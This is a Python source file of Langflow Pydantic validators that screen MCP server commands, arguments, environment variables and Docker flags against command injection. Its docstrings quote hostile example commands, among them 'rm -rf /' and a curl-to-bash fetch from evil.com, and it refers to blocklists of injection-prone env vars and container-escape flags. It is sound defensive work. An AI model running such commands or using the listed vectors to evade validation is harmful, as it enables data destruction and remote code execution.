"""Pydantic schemas for v2 API endpoints."""

# SECURITY: MCP stdio allowlist/blocklist data and the base-command helper live in lfx
# (lfx.base.mcp.security) so this REST-layer validator and the flow-execution-time enforcement
# in lfx.base.mcp.util share a single source of truth and can never drift apart.
from lfx.base.mcp.security import (
    ALLOWED_MCP_COMMANDS,
    DANGEROUS_ENV_VARS,
    DANGEROUS_KEYWORDS,
    DANGEROUS_SHELL_CHARS,
    DOCKER_DANGEROUS_ARG_PREFIXES,
    DOCKER_DANGEROUS_ARGS,
    SHELL_EXEC_FLAGS,
    SHELL_WRAPPERS,
)
from lfx.base.mcp.security import (
    extract_base_command as _extract_base_command,
)
from pydantic import BaseModel, ConfigDict, field_validator, model_validator

from langflow.logging import logger


class MCPServerConfig(BaseModel):
    """Pydantic model for MCP server configuration."""

    command: str | None = None
    args: list[str] | None = None
    env: dict[str, str] | None = None
    headers: dict[str, str] | None = None
    url: str | None = None

    model_config = ConfigDict(extra="allow")

    @field_validator("command")
    @classmethod
    def validate_command(cls, v: str | None) -> str | None:
        """Validate MCP command against allowlist to prevent command injection.

        This prevents attackers from executing arbitrary commands via the MCP stdio interface.
        Only approved MCP server executables are allowed.

        Special handling: cmd/sh/bash are allowed ONLY as wrappers for other allowed commands
        (e.g., "cmd /c uvx ..." is OK, but "cmd /c rm ..." is blocked by args validation).

        Args:
            v: The command string to validate

        Returns:
            The validated command string

        Raises:
            ValueError: If the command is not in the allowlist
        """
        if v is None:
            return None

        base_command = _extract_base_command(v)

        if base_command not in ALLOWED_MCP_COMMANDS:
            allowed_list = ", ".join(sorted(ALLOWED_MCP_COMMANDS))
            msg = f"Command '{base_command}' is not allowed for security reasons. Allowed commands: {allowed_list}"
            logger.warning("MCP command rejected: '{}' (full_path='{}')", base_command, v)
            raise ValueError(msg)

        return v

    @model_validator(mode="after")
    def validate_shell_wrapper_args(self) -> "MCPServerConfig":
        """Validate shell wrapper usage and -c/-/c flags.

        This validator:
        1. Ensures -c and /c flags are only used with shell wrappers (cmd/sh/bash)
        2. Validates that shell wrappers only wrap allowed commands

        This prevents attacks like:
        - cmd /c rm -rf /
        - sh -c "curl evil.com | bash"
        - python -c "malicious code"  (blocked: -c not allowed for python)

        While allowing legitimate patterns like:
        - cmd /c uvx mcp-server
        - sh -c "npx @modelcontextprotocol/server-filesystem"

        Returns:
            Self if validation passes

        Raises:
            ValueError: If validation fails
        """
        if not self.command or not self.args:
            return self

        base_command = _extract_base_command(self.command)
        has_shell_exec_flag = any(arg in SHELL_EXEC_FLAGS for arg in self.args)

        # Shell exec flags (-c, /c) are ONLY allowed with shell wrappers
        if has_shell_exec_flag and base_command not in SHELL_WRAPPERS:
            msg = f"Flag -c or /c is only allowed with shell wrappers (cmd/sh/bash), not with '{base_command}'"
            logger.warning("MCP -c flag rejected for non-shell command: {}", base_command)
            raise ValueError(msg)

        # For shell wrappers, validate the wrapped command
        if base_command in SHELL_WRAPPERS:
            # Find the wrapped command after shell exec flag
            wrapped_command = None
            for i, arg in enumerate(self.args):
                if arg in SHELL_EXEC_FLAGS and i + 1 < len(self.args):
                    wrapped_command = self.args[i + 1]
                    break

            if wrapped_command:
                wrapped_base = _extract_base_command(wrapped_command)
                # Shell wrappers can only wrap other allowed commands (not other shells)
                allowed_wrapped = ALLOWED_MCP_COMMANDS - SHELL_WRAPPERS

                if wrapped_base not in allowed_wrapped:
                    msg = (
                        f"Shell wrapper '{base_command}' cannot execute '{wrapped_base}'. "
                        f"Only these commands can be wrapped: {', '.join(sorted(allowed_wrapped))}"
                    )
                    logger.warning(
                        "MCP shell wrapper rejected: {} {} -> wrapped command '{}' not allowed",
                        base_command,
                        self.args,
                        wrapped_base,
                    )
                    raise ValueError(msg)

        return self

    @field_validator("args")
    @classmethod
    def validate_args(cls, v: list[str] | None) -> list[str] | None:
        """Validate MCP command arguments to prevent shell injection and code execution.

        Blocks shell metacharacters and dangerous flags that could be used for
        command injection, code execution, or package installation attacks.

        Note: -c and /c flags are validated in the model validator where we have
        command context (they're allowed for shell wrappers but not other commands).

        Args:
            v: The list of arguments to validate

        Returns:
            The validated arguments list

        Raises:
            ValueError: If any argument contains dangerous patterns
        """
        if v is None:
            return None

        for arg in v:
            for char in DANGEROUS_SHELL_CHARS:
                if char in arg:
                    msg = f"Argument contains dangerous shell metacharacter '{char}': {arg}"
                    logger.warning("MCP argument rejected - shell metacharacter '{}' in arg", char)
                    raise ValueError(msg)

        # Check dangerous keywords, but skip shell exec flags (validated in model validator)
        for arg in v:
            arg_lower = arg.lower()
            if arg_lower in DANGEROUS_KEYWORDS and arg_lower not in SHELL_EXEC_FLAGS:
                msg = f"Argument '{arg}' is not allowed for security reasons"
                logger.warning("MCP argument rejected - dangerous keyword: '{}'", arg)
                raise ValueError(msg)

        return v

    @field_validator("env")
    @classmethod
    def validate_env(cls, v: dict[str, str] | None) -> dict[str, str] | None:
        """Validate environment variables to prevent code injection via approved commands.

        Blocks environment variables that can force approved commands (node, python, etc.)
        to load and execute attacker-controlled code (e.g. LD_PRELOAD, NODE_OPTIONS, PATH).

        Args:
            v: The environment variable dict to validate

        Returns:
            The validated environment dict

        Raises:
            ValueError: If any env var name is in the blocklist
        """
        if v is None:
            return None

        for key in v:
            lower_key = key.lower()
            if lower_key in DANGEROUS_ENV_VARS or lower_key.startswith("bash_func_"):
                msg = f"Environment variable '{key}' is not allowed for security reasons"
                logger.warning("MCP env var rejected: '{}'", key)
                raise ValueError(msg)

        return v

    @model_validator(mode="after")
    def validate_docker_args(self) -> "MCPServerConfig":
        """Block Docker-specific arguments that break container isolation.

        Only applies when the command resolves to ``docker``. Prevents
        ``--privileged``, host-namespace sharing, and capability escalation.

        Returns:
            The validated config

        Raises:
            ValueError: If a dangerous Docker argument is detected
        """
        if not self.command or not self.args:
            return self

        base_command = _extract_base_command(self.command)
        if base_command != "docker":
            return self

        for arg in self.args:
            if arg in DOCKER_DANGEROUS_ARGS or arg.startswith(DOCKER_DANGEROUS_ARG_PREFIXES):
                msg = f"Docker argument '{arg}' is not allowed for security reasons"
                logger.warning("MCP Docker argument rejected: '{}'", arg)
                raise ValueError(msg)

        return self
